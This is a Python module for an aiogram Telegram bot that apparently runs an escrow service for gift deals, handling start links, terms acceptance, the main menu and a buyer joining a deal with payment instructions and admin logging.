from pathlib import Path

from aiogram import Router, Bot, F
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.fsm.context import FSMContext

from database import Database
from config import TEXTS
from keyboards.inline import terms_kb, welcome_kb, main_menu_kb
from utils import send_log, fmt_username

router = Router()

PHOTOS_DIR = Path("photos")
PHOTOS_DIR.mkdir(exist_ok=True)


def get_photo() -> FSInputFile | None:
    for ext in ("jpg", "jpeg", "png", "webp"):
        path = PHOTOS_DIR / f"main.{ext}"
        if path.exists():
            return FSInputFile(str(path))
    return None


async def send_main_menu(bot: Bot, chat_id: int, db: Database, lang: str, state: FSMContext):
    await state.clear()
    site_url = await db.get_setting("website_url")
    text = TEXTS[lang]["main_menu_text"]
    photo = get_photo()
    kb = main_menu_kb(lang, site_url)
    if photo:
        try:
            await bot.send_photo(chat_id, photo=photo, caption=text, reply_markup=kb)
            return
        except Exception:
            pass
    await bot.send_message(chat_id, text, reply_markup=kb)


@router.message(CommandStart())
async def cmd_start(message: Message, db: Database, state: FSMContext, bot: Bot):
    tg_id = message.from_user.id
    username = message.from_user.username

    await db.create_user(tg_id, username)
    await db.update_user_username(tg_id, username)

    if await db.is_banned(tg_id):
        lang = await db.get_language(tg_id)
        await message.answer(TEXTS[lang]["banned"])
        return

    user = await db.get_user(tg_id)
    lang = user["language"]

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1][5:]
        await handle_deal_start(message, db, deal_id, lang, bot)
        return

    if user["agreed_terms"]:
        await send_main_menu(bot, tg_id, db, lang, state)
        return

    terms_url = await db.get_setting("terms_url")
    text = (
        f"{TEXTS[lang]['terms_text']}\n\n"
        f"Подробнее: {terms_url}"
    )
    photo = get_photo()
    if photo:
        try:
            await message.answer_photo(photo=photo, caption=text, reply_markup=terms_kb(lang))
        except Exception:
            await message.answer(text, reply_markup=terms_kb(lang))
    else:
        await message.answer(text, reply_markup=terms_kb(lang))

    await send_log(
        bot,
        f"🆕 <b>Новый пользователь</b>\n"
        f"👤 {fmt_username(username, tg_id)}\n"
        f"🆔 ID: <code>{tg_id}</code>",
        topic="users",
        db=db,
    )


async def handle_deal_start(message: Message, db: Database, deal_id: str, lang: str, bot: Bot):
    deal = await db.get_deal(deal_id)
    buyer_id = message.from_user.id
    buyer_username = message.from_user.username or ""

    if not deal:
        await message.answer(TEXTS[lang]["deal_not_found"])
        return

    if deal["status"] == "cancelled":
        await message.answer("❌ Эта сделка была отменена.")
        return

    if deal["status"] == "completed":
        await message.answer("✅ Эта сделка уже завершена.")
        return

    if deal["creator_id"] == buyer_id:
        await message.answer("❌ Вы не можете быть покупателем в своей же сделке.")
        return

    if deal["status"] == "paid":
        await message.answer(
            "⏳ Сделка уже оплачена. Ожидается подтверждение от продавца."
        )
        return

    if deal["status"] == "gift_sent":
        from keyboards.inline import buyer_confirm_receipt_kb
        gift_account = await db.get_setting("gift_account")
        await message.answer(
            f"🎁 Продавец уже передал подарок на аккаунт {gift_account}.\n\n"
            f"Переведите подарок себе и нажмите кнопку подтверждения.",
            reply_markup=buyer_confirm_receipt_kb(deal_id)
        )
        return

    creator = await db.get_user(deal["creator_id"])
    creator_username = creator["username"] if creator else ""
    creator_success = creator["successful_deals"] if creator else 0

    card_number = await db.get_setting("card_number")
    card_name = await db.get_setting("card_name")
    card_bank = await db.get_setting("card_bank")

    links_list = deal["gift_links"].splitlines()
    gifts_text = "\n".join(f"• {l}" for l in links_list)

    text = (
        f"🛡 <b>Информация о сделке #{deal_id}</b>\n\n"
        f"Вы покупатель в сделке.\n"
        f"Продавец: @{creator_username} (<code>{deal['creator_id']}</code>)\n"
        f"• Успешные сделки: {creator_success}\n\n"
        f"Вы покупаете:\n{gifts_text}\n\n"
        f"Тип: Подарок\n\n"
        f"Оплата производится переводом на карту менеджера:\n"
        f"<code>{card_number}</code> — {card_name}, {card_bank}\n\n"
        f"После перевода нажмите кнопку «💳 Я оплатил»\n\n"
        f"<b>Сумма к оплате: {deal['amount']} {deal['currency']}</b>"
    )

    from keyboards.inline import buyer_deal_kb
    await message.answer(text, reply_markup=buyer_deal_kb(deal_id), parse_mode="HTML")

    await db.set_deal_buyer(deal_id, buyer_id, buyer_username)

    creator_user = await db.get_user(deal["creator_id"])
    creator_lang = creator_user["language"] if creator_user else "ru"
    try:
        await bot.send_message(
            deal["creator_id"],
            f"👤 Пользователь @{buyer_username} (<code>{buyer_id}</code>) "
            f"присоединился к сделке <b>#{deal_id}</b>\n\n"
            f"• Успешные сделки: {creator_success}\n"
            f"• Тип сделки: Подарок\n\n"
            f"Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!",
            parse_mode="HTML"
        )
    except Exception:
        pass

    await send_log(
        bot,
        f"👁 <b>Покупатель присоединился к сделке</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"🛍 Покупатель: @{buyer_username} | ID: <code>{buyer_id}</code>\n"
        f"👤 Продавец: @{creator_username} | ID: <code>{deal['creator_id']}</code>",
        topic="deals",
        db=db,
    )


@router.callback_query(F.data == "agree_terms")
async def agree_terms(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    await db.set_agreed_terms(tg_id)
    lang = await db.get_language(tg_id)

    channel_url = await db.get_setting("channel_url")
    support_username = await db.get_setting("support_username")

    text = TEXTS[lang]["welcome"].format(
        channel=channel_url,
        support=support_username
    )
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(text, reply_markup=welcome_kb(lang))

    await send_log(
        bot,
        f"✅ <b>Пользователь принял условия</b>\n"
        f"👤 {fmt_username(callback.from_user.username, tg_id)}\n"
        f"🆔 ID: <code>{tg_id}</code>",
        topic="users",
        db=db,
    )
    await callback.answer()


@router.callback_query(F.data == "go_main")
async def go_main(callback: CallbackQuery, db: Database, state: FSMContext, bot: Bot):
    tg_id = callback.from_user.id
    if await db.is_banned(tg_id):
        lang = await db.get_language(tg_id)
        await callback.answer(TEXTS[lang]["banned"], show_alert=True)
        return
    lang = await db.get_language(tg_id)
    await state.clear()
    site_url = await db.get_setting("website_url")
    text = TEXTS[lang]["main_menu_text"]
    photo = get_photo()
    kb = main_menu_kb(lang, site_url)

    try:
        if photo:
            await callback.message.delete()
            await bot.send_photo(tg_id, photo=photo, caption=text, reply_markup=kb)
        else:
            await callback.message.edit_text(text, reply_markup=kb)
    except Exception:
        await bot.send_message(tg_id, text, reply_markup=kb)

    await callback.answer()
